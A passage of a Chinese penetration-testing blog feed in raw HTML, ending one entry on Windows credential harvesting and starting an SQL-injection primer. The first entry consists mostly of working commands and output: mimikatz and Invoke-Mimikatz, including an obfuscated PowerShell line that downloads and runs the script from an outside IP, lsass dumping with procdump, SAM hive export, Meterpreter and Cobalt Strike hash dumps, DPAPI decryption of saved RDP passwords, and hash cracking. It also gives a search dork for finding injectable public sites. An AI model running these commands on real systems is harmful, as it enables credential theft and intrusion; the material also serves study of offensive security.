class="line">privilege::debug    //提升权限</span><br><span class="line">inject::process lsass.exe sekurlsa.dll   //将 sekurlsa.dll 注入到 lsass.exe 进程里</span><br><span class="line">@getLogonPasswords     //获取密码</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win10：</span><br><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">token::elevate#窃取、冒充令牌,获取与令牌对应的权限，该命令可以查看我们可以窃取哪些token</span><br><span class="line">lsadump::sam#列出密码凭证及用户信息,可以得到一些ntml hash </span><br><span class="line">#拿到hash后就可以尝试解析明文或者hash传递攻击</span><br><span class="line">lsadump::secrets#Get the SysKey to decrypt SECRETS entries (from registry or hives)</span><br><span class="line">   #获取系统密钥以解密文条目（从注册表或配置单元获取）</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">win7：可以直接获得明文密码</span><br><span class="line">privilege::debug    </span><br><span class="line">sekurlsa::logonpasswords </span><br></pre></td></tr></table></figure><h3 id="Powershell脚本"><a href="#Powershell脚本" class="headerlink" title="Powershell脚本"></a>Powershell脚本</h3><blockquote><p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1</a><br><a href="https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1">https://github.com/PowerShellMafia/PowerSploit/raw/master/Exfiltration/Invoke-Mimikatz.ps1</a><br><a href="https://raw.githubusercontent.com/Mr-xn/Penetration_Testing_POC/master/tools/Invoke-Mimikatz.ps1">https://raw.githubusercontent.com/Mr-xn/Penetration_Testing_POC/master/tools/Invoke-Mimikatz.ps1</a></p></blockquote><p>Powershell本地加载mimikatz脚本：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#x27;&quot;privilege::debug&quot; &quot;sekurlsa::logonPasswords full&quot;&#x27;</span><br><span class="line">powershell Import-Module .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#x27;&quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::sam&quot;&#x27;</span><br></pre></td></tr></table></figure><p>Powershell远程加载mimikatz脚本:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://47.101.214.85:8000/Invoke-Mimikatz.ps1&#x27;);Invoke-Mimikatz –DumpCreds</span><br></pre></td></tr></table></figure><p>powershell混淆:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell -c &quot; (&#x27;IEX &#x27;+&#x27;(Ne&#x27;+&#x27;w-O&#x27;+&#x27;bject Ne&#x27;+&#x27;t.W&#x27;+&#x27;ebClien&#x27;+&#x27;t).Do&#x27;+&#x27;wnloadS&#x27;+&#x27;trin&#x27;+&#x27;g&#x27;+&#x27;(&#x27;+&#x27;1vchttp://&#x27;+&#x27;47.101.214&#x27;+&#x27;.85:8000/&#x27;+&#x27;Inv&#x27;+&#x27;oke-Mimik&#x27;+&#x27;a&#x27;+&#x27;tz.&#x27;+&#x27;ps11v&#x27;+&#x27;c)&#x27;+&#x27;;&#x27;+&#x27;I&#x27;+&#x27;nvoke-Mimika&#x27;+&#x27;tz&#x27;).REplaCE(&#x27;1vc&#x27;,[STRing][CHAR]39)|IeX&quot;</span><br></pre></td></tr></table></figure><p>Powershell 加载 Get-PassHashes脚本：</p><blockquote><p><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1">https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell IEX(new-object net.webclient).downloadstring(&#x27;http://47.101.214.85:8000/Get-PassHashes.ps1&#x27;);Get-PassHashes</span><br></pre></td></tr></table></figure><h3 id="procdump-mimikatz"><a href="#procdump-mimikatz" class="headerlink" title="procdump+mimikatz"></a>procdump+mimikatz</h3><p>Procdump下载： <a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump</a><br>Procdump lsass  进程导出:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">For 32bits：</span><br><span class="line">procdump.exe -accepteula -ma lsass.exe lsass.dmp</span><br><span class="line">For 64bits：</span><br><span class="line">procdump.exe -accepteula -64 -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure><p>然后使用 mimikatz  还原密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::minidump lsass.dmp</span><br><span class="line">sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure><h3 id="注册表导出Hash"><a href="#注册表导出Hash" class="headerlink" title="注册表导出Hash"></a>注册表导出Hash</h3><p>reg save命令 保存注册表</p><p>HKLM是HKEY_LOCAL_MACHINE的缩写</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208072236447.png" alt="image-20220807223639163" style="zoom:50%;" /><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">我们解析sam.hiv需要使用system.hiv中的key，所以需要先解密system.hiv</span><br><span class="line">reg save HKLM\SYSTEM system.hiv</span><br><span class="line">reg save HKLM\SAM sam.hiv</span><br><span class="line">reg save HKLM\SECURITY security.hiv</span><br></pre></td></tr></table></figure><p>mimikatz：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::sam /system:system.hiv /sam:sam.hiv&quot; exit</span><br></pre></td></tr></table></figure><p>impacket：</p><blockquote><p><a href="https://github.com/SecureAuthCorp/impacket/tree/master/examples">https://github.com/SecureAuthCorp/impacket/tree/master/examples</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL</span><br></pre></td></tr></table></figure><h3 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h3><blockquote><p><a href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirements.txt</span><br><span class="line"># 如果提示找不到 Crypto 模块， 就到 pip包安装位置C:\Users\[User]\AppData\Roaming\Python\Python38\site-packages把crypto文件夹重命名为Crypto</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290811830.png" alt="image-20220729081127638"></p><h3 id="Meterpreter获取Hash"><a href="#Meterpreter获取Hash" class="headerlink" title="Meterpreter获取Hash"></a>Meterpreter获取Hash</h3><ul><li>Hashdump</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">use post/windows/gather/hashdump    //system权限的meterpreter</span><br><span class="line">set session 1</span><br><span class="line">exploit //结果保存在tmp目录下</span><br><span class="line">use post/windows/gather/smart_hashdump</span><br><span class="line">set session 1</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>Hash格式： 用户名称:RID:LM-HASH值:NTLM-HASH值</p><ul><li>Mimikatz</li></ul><p>Hashdump 使用的是 mimikatz 的部分功能</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load mimikatz   //加载模块</span><br><span class="line">wdigest 、kerberos 、msv 、ssp 、tspkg 、livessp    //获取用户密码的hash值</span><br><span class="line">mimikatz_command -h</span><br><span class="line">mimikatz_command -f ::   //查询有哪些模块</span><br><span class="line">mimikatz_command -f  samdump::hashes    //从windows的sam文件中读取密码hash值</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords   //获取明文密码</span><br><span class="line">mimikatz_command -f samdump::bootkey</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># msf6</span><br><span class="line">load kiwi</span><br><span class="line">help kiwi</span><br><span class="line">creds_all  //列举系统中的明文密码</span><br><span class="line">lsa_dump_sam  //读取sam文件</span><br><span class="line">kiwi_cmd sekurlsa::logonpasswords  //kiwi_cmd命令后面接mimikatz的命令</span><br></pre></td></tr></table></figure><h3 id="CobaltStrike获取Hash"><a href="#CobaltStrike获取Hash" class="headerlink" title="CobaltStrike获取Hash"></a>CobaltStrike获取Hash</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; hashdump</span><br><span class="line">beacon&gt; logonpasswords</span><br><span class="line">beacon&gt; mimikatz sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><h2 id="其他密码凭证获取"><a href="#其他密码凭证获取" class="headerlink" title="其他密码凭证获取"></a>其他密码凭证获取</h2><h3 id="1-RDP连接密码解密"><a href="#1-RDP连接密码解密" class="headerlink" title="1 RDP连接密码解密"></a>1 RDP连接密码解密</h3><h4 id="mimikatz-1"><a href="#mimikatz-1" class="headerlink" title="mimikatz"></a>mimikatz</h4><ul><li>查看本地机器本地连接过的目标机器。</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br></pre></td></tr></table></figure><ul><li>查看本地用户此目录下是否存有RDP密码文件</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1E85A94EE31F584E484B8120E3ADA266</span><br><span class="line">9D4E7B34E2541E8AB9F716D127DFFC87</span><br><span class="line">AAAD88ECA44F5AAA1754B5E18F7EB12D</span><br><span class="line">DFBE70A7E5CC19A398EBF1B96859CE5D</span><br><span class="line">E05DBE15D38053457F3523A375594044</span><br></pre></td></tr></table></figure><ul><li>查看保存在本地的远程主机信息</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmdkey /list</span><br></pre></td></tr></table></figure><ul><li>选择一个密码文件对其进行解密。</li></ul><p>此处需要记录下 guidMasterKey 的值，待会要通过 guidMasterKey 找对应的 Masterkey 。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">dpapi::cred </span><br><span class="line">/in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\1E85A94EE31F584E484B8120E3ADA266</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">guidMasterKey      : &#123;34dc48bb-0af9-4925-bf07-f54ba502a40a&#125;</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207311118273.png" alt="image-20220729082150066"></p><ul><li>根据 guidMasterKey  找到对应的 Masterkey</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sekurlsa::dpapi</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290823475.png" alt="image-20220729082254297"></p><ul><li>通过 Masterkey 解密 pbData 数据，拿到明文 RDP 连接密码</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpapi::cred </span><br><span class="line">/in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\1E85A94EE31F584E484B8120E3ADA266 </span><br><span class="line">/masterkey:f391aa638da6b6d846685f84660ee638bd6d3122214de34285b4dd3bd827a5c3925c5bd7a448c175457c19b2556c9f6f5248ef9256060a5b74c1264d3a5a99f8</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290824301.png" alt="image-20220729082414076"></p><h4 id="netpass"><a href="#netpass" class="headerlink" title="netpass"></a>netpass</h4><blockquote><p><a href="https://www.nirsoft.net/x64_download_package.html">https://www.nirsoft.net/x64_download_package.html</a><br><a href="https://www.nirsoft.net/packages/x64tools.zip">https://www.nirsoft.net/packages/x64tools.zip</a>     nirsoft123!</p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202207290824401.png" alt="image-20220729082451257"></p><h4 id="Powershell脚本获取RDP连接记录"><a href="#Powershell脚本获取RDP连接记录" class="headerlink" title="Powershell脚本获取RDP连接记录"></a>Powershell脚本获取RDP连接记录</h4><blockquote><p><a href="https://github.com/3gstudent/List-RDP-Connections-History.git">https://github.com/3gstudent/List-RDP-Connections-History.git</a></p></blockquote><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040700775.png" alt="image-20220804070000501"></p><h4 id="Cobaltstrike"><a href="#Cobaltstrike" class="headerlink" title="Cobaltstrike"></a>Cobaltstrike</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br><span class="line">[*] Tasked beacon to run: reg query &quot;HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers&quot; /s</span><br><span class="line">[+] host called home, sent: 113 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"></span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Servers\10.10.10.6    UsernameHint    REG_SZ    MINGY\Administrator</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br><span class="line">[*] Tasked beacon to run: dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</span><br><span class="line">[+] host called home, sent: 89 bytes</span><br><span class="line">[+] received output:</span><br><span class="line"> 驱动器 C 中的卷没有标签。</span><br><span class="line"> 卷的序列号是 C883-5B4B</span><br><span class="line"> C:\Users\Administrator\AppData\Local\Microsoft\Credentials 的目录</span><br><span class="line">2020/09/04  13:24    &lt;DIR&gt;          .</span><br><span class="line">2020/09/04  13:24    &lt;DIR&gt;          ..</span><br><span class="line">2020/09/04  13:24               434 8CAC243098BA9DDD4EAB58433B85D7F0</span><br><span class="line">   1 个文件            434 字节</span><br><span class="line">               2 个目录 56,959,107,072 可用字节</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">beacon&gt; shell cmdkey /list</span><br><span class="line">[*] Tasked beacon to run: cmdkey /list</span><br><span class="line">[+] host called home, sent: 43 bytes</span><br><span class="line">[+] received output:</span><br><span class="line">当前保存的凭据:</span><br><span class="line">    目标: Domain:target=TERMSRV/10.10.10.6</span><br><span class="line">    类型: 域密码</span><br><span class="line">    用户: WIN7-1\administrator</span><br><span class="line">    本地机器持续时间</span><br><span class="line">    </span><br><span class="line">    目标: LegacyGeneric:target=MINGY\WIN7-1</span><br><span class="line">    类型: 普通 </span><br><span class="line">    用户: MINGY\WIN7-1</span><br><span class="line">    </span><br><span class="line">    目标: LegacyGeneric:target=WIN7-1\Administrator</span><br><span class="line">    类型: 普通 </span><br><span class="line">    用户: WIN7-1\Administrator</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;dpapi::cred </span><br><span class="line">/in:C:\Users\mingy\AppData\Local\Microsoft\Credentials\8CAC243098BA9DDD4EAB58433</span><br><span class="line">B85D7F0&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure><h3 id="2-Mysql数据库密码破解"><a href="#2-Mysql数据库密码破解" class="headerlink" title="2 Mysql数据库密码破解"></a>2 Mysql数据库密码破解</h3><p>一旦获取了网站一定的权限后，如果能够获取MySQL中保存用户数据，通过解密后，即可通过正常途径来访问数据库；一方面可以直接操作数据库中的数据，另一方面可以用来提升权限。<br>MySQL数据库用户密码跟其它数据库用户密码一样，在应用系统代码中都是以明文出现的，在获取文件读取权限后即可直接从数据库连接文件中读取<br>一般都包含有<strong>数据库类型，物理位置，用户名和密码</strong>等信息</p><h4 id="1、MYSQL数据库文件类型"><a href="#1、MYSQL数据库文件类型" class="headerlink" title="1、MYSQL数据库文件类型"></a>1、MYSQL数据库文件类型</h4><p>MYSQL数据库文件共有 frm 、 MYD 和 MYI 三种文件</p><ul><li>“.frm” 是描述表结构的文件</li><li>“.MYD” 是表的数据文件</li><li>“.MYI” 是表数据文件中任何索引的数据树</li></ul><p>一般是单独存在一个文件夹中<br>与用户有关的一共有三个文件即 user.frm 、 user.MYD 和 user.MYI ，MYSQL数据库用户密码都保存在 user.MYD 文件中，包括root用户和其他用户的密码。</p><h4 id="2、Mysql加密方式"><a href="#2、Mysql加密方式" class="headerlink" title="2、Mysql加密方式"></a>2、Mysql加密方式</h4><p>MYSQL数据库的认证密码有两种方式<br>MYSQL 4.1版本之前是MYSQL323加密，MYSQL 4.1和之后的版本都是MYSQLSHA1加密<br>MYSQL数据库中自带 Old_Password(str)  和 Password(str) 函数,它们均可以在MYSQL数据库里进行查询，前者是 MYSQL323 加密，后者是 MYSQLSHA1 方式加密。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; select Password(&#x27;root&#x27;);</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| Password(&#x27;root&#x27;)                          |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">| *81F5E21E35407D884A6CD4A731AEBFB6AF209E1B |</span><br><span class="line">+-------------------------------------------+</span><br><span class="line">1 row in set</span><br></pre></td></tr></table></figure><p>MYSQL323 加密中生成的是16位字符串，而在 MYSQLSHA1 中生成的是41位字符串，其中 * 是不加入实际的密码运算中， MYSQLSHA1 加密的密码的实际位数是40位</p><h4 id="3、获取Mysql数据库密码hash值"><a href="#3、获取Mysql数据库密码hash值" class="headerlink" title="3、获取Mysql数据库密码hash值"></a>3、获取Mysql数据库密码hash值</h4><p>用winhex编辑器打开user.MYD文件，使用二进制模式查看，即可得到密码Hash值：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040710562.png" alt="image-20220804071007319"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br></pre></td></tr></table></figure><h4 id="4、Hash破解"><a href="#4、Hash破解" class="headerlink" title="4、Hash破解"></a>4、Hash破解</h4><ul><li>在线网站破解</li></ul><blockquote><p><a href="http://www.cmd5.com/">www.cmd5.com</a><br><a href="http://www.somd5.com/">www.somd5.com</a></p></blockquote><ul><li>hashcat破解</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat.exe -m 300 -a 3 81F5E21E35407D884A6CD4A731AEBFB6AF209E1B</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040711282.png" alt="image-20220804071121105"></p><ul><li>john the ripper破解</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john --list=format | grep mysql</span><br><span class="line">john --format=mysql-sha1 mysql.hash</span><br></pre></td></tr></table></figure><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040712296.png" alt="image-20220804071203110"></p><ul><li>Cain破解</li></ul><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202208040712139.png" alt="image-20220804071219948"></p><h3 id="3-其他应用程序密码破解"><a href="#3-其他应用程序密码破解" class="headerlink" title="3 其他应用程序密码破解"></a>3 其他应用程序密码破解</h3><blockquote><p><a href="https://github.com/uknowsec/SharpDecryptPwd">https://github.com/uknowsec/SharpDecryptPwd</a></p></blockquote><p>对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager系列产品（Xshell,Xftp)。</p><blockquote><p>源码：<a href="https://github.com/RowTeam/SharpDecryptPwd">https://github.com/RowTeam/SharpDecryptPwd</a></p></blockquote><h1 id="域内密码凭证获取"><a href="#域内密码凭证获取" class="headerlink" title="域内密码凭证获取"></a>域内密码凭证获取</h1><p>见后面域内横向移动那一节~~</p><h1 id="关于Windows的其他知识"><a href="#关于Windows的其他知识" class="headerlink" title="关于Windows的其他知识"></a>关于Windows的其他知识</h1><ol><li>域内账户登录和本机登录的区别</li></ol><p>域内登录需要带上域的域名如GUNGNIR\bob</p><p>当服务器安装完域控制器相关组建后后，这台机器就被提升为域控，本地的administrator账户会被提升为域内的管理员账户。</p><p>域内主机登录本地账户呢 需要以主机名\用户名的形式，比如说一台名为WEB的主机的本地administrator用户是以WEB\administrator形式登录，亦或者.\administrator</p><ol start="2"><li>关于我们获取到内网的一台主机的密码和hash后，我们可以去找脚本或者自己写，使用密码批量登录内网网段的机器，很大概率能拿下很多机器</li></ol>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> Windows认证机制 </tag>
            
            <tag> 凭证获取 </tag>
            
            <tag> NTLM </tag>
            
            <tag> 票据伪造原理 </tag>
            
            <tag> Kerberos </tag>
            
            <tag> 域认证 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x07 - Web安全基础-SQL注入</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/0x07-Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-SQL%E6%B3%A8%E5%85%A5.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/0x07-Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80-SQL%E6%B3%A8%E5%85%A5.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="SQL注入简介"><a href="#SQL注入简介" class="headerlink" title="SQL注入简介"></a>SQL注入简介</h1><h2 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h2><h3 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入?"></a>什么是SQL注入?</h3><p><u>利用现有应用程序，将恶意的SQL命令注入到 <strong>Web 表单提交</strong>、<strong>url中页面请求的查询字符串</strong>或<strong>某些请求头部</strong>中，并在这些注入点的语句<strong>具有在数据库引擎中执行的能力</strong>，最终达到欺骗服务器执行指定的 SQL 语句。</u></p><p>SQL注入漏洞存在的主要原因是由于WEB应用程序对用户输入的数据合法性判断不严格导致，没有细致地过滤用户输入的数据，致使非法数据侵入系统。。攻击者把恶意SQL命令语句作为输入，被服务器SQL解释器正确解析执行，数据库把查询到的结果返回给服务器，然后呈现给攻击者，攻击者由此获得数据库内的数据信息。</p><p>根据相关技术原理，SQL 注入可以分为<strong>平台层注入</strong>和<strong>代码层注入</strong>。</p><ul><li>前者 由不安全的数据库配置或数据库平台的漏洞所致；</li><li>后者 主要是由于程序员对输入未进行细致地过滤， 从而执行了非法的数据查询。</li></ul><h3 id="SQL注入的漏洞条件-x2F-成因"><a href="#SQL注入的漏洞条件-x2F-成因" class="headerlink" title="SQL注入的漏洞条件&#x2F;成因"></a>SQL注入的漏洞条件&#x2F;成因</h3><p>主要原因归结如下两点：</p><ul><li>程序编写者在处理应用程序和数据库交互时，使用<strong>字符串拼接的方式</strong>构造SQL语句，并且<strong>带入数据库</strong>查询</li><li><strong>未对用户可控参数进行足够的过滤</strong>便将参数内容拼接进入SQL语句中</li></ul><blockquote><p>&#x3D;&#x3D;&#x3D;&gt;三个关键词总结便是：<strong>带入数据库查询；参数可控；过滤不严</strong></p></blockquote><p>还有一些其他原因也可能导致sql注入</p><ul><li>不当的类型处理；</li><li>不安全的数据库配置；</li><li>不合理的查询集处理；</li><li>不当的错误处理；</li><li>转义字符处理不合适；</li><li>多个提交处理不当。</li></ul><h3 id="关于sql注入我的感悟："><a href="#关于sql注入我的感悟：" class="headerlink" title="关于sql注入我的感悟："></a>关于sql注入我的感悟：</h3><p>在寻找sql注入之前，我们要寻找到的是网页上能和数据库产生数据交互的地方，不论是GET还是POST，都是寻找用户能控制的数据输入。当有数据交互时，我们就要着重去测试是否sql注入漏洞</p><p>sql注入的关键在于找到sql是<strong>何种闭合方式</strong></p><h3 id="一次正常的数据库查询过程"><a href="#一次正常的数据库查询过程" class="headerlink" title="一次正常的数据库查询过程"></a>一次正常的数据库查询过程</h3><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210061442687.png" alt="image-20221006144223479" style="zoom:50%;" /><h3 id="SQL注入过程分析"><a href="#SQL注入过程分析" class="headerlink" title="SQL注入过程分析"></a>SQL注入过程分析</h3><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210061443673.png" alt="image-20221006144308442" style="zoom: 33%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210061444351.png" alt="image-20221006144456107" style="zoom:33%;" /><h2 id="SQL注入危害"><a href="#SQL注入危害" class="headerlink" title="SQL注入危害"></a>SQL注入危害</h2><p>SQL注入是危害WEB安全的主要攻击手段,存在SQL注入攻击的网站一但被攻击成功后,产生的后果将有可能是毁灭性及不可恢复的。比如：</p><ol><li>获取敏感数据：获取网站管理员帐号、密码等。（危害数据库数据）</li><li>绕过登录验证：使用万能密码登录网站后台、对数据库的数据进行增加或删除操作，例如私自添加或删除管理员账号等。（危害网站权限）</li><li>文件系统操作：列目录，读取、写入文件等。（前提是网站目录存在写入权限，可以写入网页木马。攻击者进而可以对网页进行篡改，发布一些违法信息等）</li><li>注册表操作：读取、写入、删除注册表等。（危害服务器）</li><li>执行系统命令：远程执行命令。（失陷，经过提权等步骤，服务器最高权限被攻击者获取）</li><li>通过一个网站的sql注入漏洞，拿到数据库用户权限后，可能危及同一个服务器上其他的网站数据库的数据安全。甚至拿到另一个数据库的敏感数据后，可以借此拿下另一个站</li></ol><blockquote><p>注：有时候我们拿下数据库权限</p></blockquote><h2 id="SQL注入判断"><a href="#SQL注入判断" class="headerlink" title="SQL注入判断"></a>SQL注入判断</h2><p>根据客户端返回的结果来判断提交的测试语句<strong>是否成功被数据库引擎执行</strong>，如果测试语句被执行了，说明存在注入漏洞。存在注入漏洞时，表示没有对我们的sql语句进行过滤，我们就可以构造sql语句进行注入。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210061447202.png" alt="image-20221006144730988" style="zoom:50%;" /><h3 id="怎么判断一个网站是否存在sql注入漏洞呢？"><a href="#怎么判断一个网站是否存在sql注入漏洞呢？" class="headerlink" title="怎么判断一个网站是否存在sql注入漏洞呢？"></a><strong>怎么判断一个网站是否存在sql注入漏洞呢？</strong></h3><blockquote><p>老方法：</p><p><code>1 and 1=1</code> 和<code>1 and 1=2</code>如果前面正确，后面错误，意味着存在注入点，参数被带入了数据库查询</p></blockquote><blockquote><p>更简单的方法呢：</p><p>直接在注入参数后面输入一串不存在的字符串：122eadq，数据库里面肯定没有这种数据的，如果页面显示不正常可能存在注入，这意味着这个数据被带入数据库查询了~~</p><p>需要注意的是，输入后页面404和重定向不一定存在注入，这种情况没有正常显示不算存在注入点</p></blockquote><blockquote><p>还有经典的单引号判断法： 在参数后面加上单引号,比如:</p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>xxx<span class="operator">/</span>abc.php?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>如果页面返回错误，则存在 Sql 注入。 原因是无论字符型还是整型都会因为单引号个数不匹配而报错。数据库不可能存在<code>单引号&#39;</code>，这样的数据，所以必然会报错，，，</p><p>只要报错就意味着，其带入了数据库查询，所以可能存在注入漏洞</p></blockquote><blockquote><p>也可以用<code>\</code>，反斜杠来测试</p><p>反斜杠是转义，可以转义闭合的字符，，，</p></blockquote><h3 id="在公网去找可能存在注入的网站"><a href="#在公网去找可能存在注入的网站" class="headerlink" title="在公网去找可能存在注入的网站"></a>在公网去找可能存在注入的网站</h3><blockquote><p>Googlehacking：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">inurl:php?id=</span><br></pre></td></tr></table></figure></blockquote><h1 id="SQL注入的分类"><a href="#SQL注入的分类" class="headerlink" title="SQL注入的分类"></a>SQL注入的分类</h1><blockquote><ul><li><p>按参数类型分类：</p><blockquote><ul><li>数字型</li><li>字符型</li><li>搜索型</li></ul></blockquote></li><li><p>按数据库返回结果分类：</p><blockquote><ul><li>回显注入</li><li>报错注入</li><li>盲注</li><li>基于布尔的盲注</li><li>基于时间的盲注</li></ul></blockquote></li><li><p>按注入点位置分类：</p><blockquote><ul><li>GET注入</li><li>POST注入</li><li>Cookie注入</li><li>Header注入</li></ul></blockquote></li><li><p>其他分类</p><blockquote><ul><li>Double Injection</li><li>宽字节注入</li><li>内联注入</li></ul></blockquote></li></ul><p>……</p></blockquote><h2 id="按参数类型分类"><a href="#按参数类型分类" class="headerlink" title="按参数类型分类"></a>按参数类型分类</h2><blockquote><p>参数类型主要有两种：数字型、字符型。</p><p>在SQL查询语句中，数据库查询类型有以下三种：数字型、字符型、搜索型。</p><p>以sqli-labs&#x2F;Less-1&#x2F;为例</p><p>注意： 注释<code>#</code>,在url中要进行编码，<code>%23</code>，或者直接用<code>--+</code>进行注释，具体参考<a 